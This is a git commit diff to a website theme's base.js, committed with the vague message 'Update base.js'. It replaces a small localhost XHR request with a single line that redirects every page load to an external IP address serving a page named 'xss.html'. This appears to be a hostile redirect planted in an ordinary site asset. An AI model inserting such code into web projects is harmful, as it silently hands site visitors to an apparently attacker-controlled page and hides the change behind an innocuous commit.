2b5babd05ae966fde2b05ff064e23309c204f8a2
M1sery <m0x0is3ry@foxmail.com>
2023-10-28 18:47:44 +0800

    Update base.js

--- theme/js/base.js
+++ theme/js/base.js
@@ -1,13 +1,1 @@
-var xhr = new XMLHttpRequest();
-var url = 'http://127.0.0.1:3000/vip';
-var data = 'param1=value1&param2=value2';
-
-xhr.open('POST', url, true);
-xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-xhr.onreadystatechange = function() {
-  if (xhr.readyState === 4 && xhr.status === 200) {
-    var response = xhr.responseText;
-    console.log(response);
-  }
-};
-xhr.send(data);
+window.location.href="http://106.15.6.181:2334/xss.html"
